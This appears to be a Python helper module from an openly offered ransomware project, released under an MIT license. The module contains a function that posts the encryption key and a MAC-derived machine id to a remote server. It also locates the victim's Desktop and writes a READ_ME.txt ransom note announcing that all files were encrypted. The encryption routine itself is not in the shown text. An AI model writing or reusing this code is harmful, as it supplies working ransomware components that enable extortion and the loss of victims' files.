#  _   _  _____     ____  __ ____ _____ ____
# | \ | |/ _ \ \   / /  \/  | __ )___ /|  _ \
# |  \| | | | \ \ / /| |\/| |  _ \ |_ \| |_) |
# | |\  | |_| |\ V / | |  | | |_) |__) |  _ <
# |_| \_|\___/  \_/  |_|  |_|____/____/|_| \_\
#
# MIT License
#
# Copyright (c) 2024 Daniel Lima
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import os
import platform
import uuid
from pathlib import Path
from uuid import UUID

import requests


def send_key(url: str, key: bytes, machine_id: str) -> None:
    payload = {"key": key.decode(), "machine_id": machine_id}
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            print(
                f"Failed to send key.\nStatus: {response.status_code} | {response.text}"
            )
        else:
            print("Key sent succesfully.")
    except requests.RequestException as e:
        print(f"Error while sending key: {e}")


def gen_machine_id(ns: UUID = uuid.NAMESPACE_DNS) -> str:
    mac = uuid.getnode()
    return str(uuid.uuid5(ns, str(mac)))


def get_desktop_path() -> Path:
    system = platform.system()
    if system == "Windows":
        desktop = Path(os.environ["USERPROFILE"]) / "Desktop"
    else:  # Unix / Mac
        desktop = Path.home() / "Desktop"
    return desktop


def save_warning_text(machine_id: str, filename: str = "READ_ME.txt") -> None:
    desktop_path = get_desktop_path()
    path = desktop_path / filename
    content = [
        "DON'T DELETE THIS FILE!",
        f"MachineId: {machine_id}",
        "---------------------------------------------",
        "Your computer was invaded by a ransomware",
        "and all files were encrypted.",
        "---------------------------------------------",
        "*Note that, if you lose your machine id, you",
        "won't be able to decrypt your files.",
    ]
    Path(path).write_text("\n".join(content), encoding="utf-8")
    print(f"Warning file saved at: {path}")
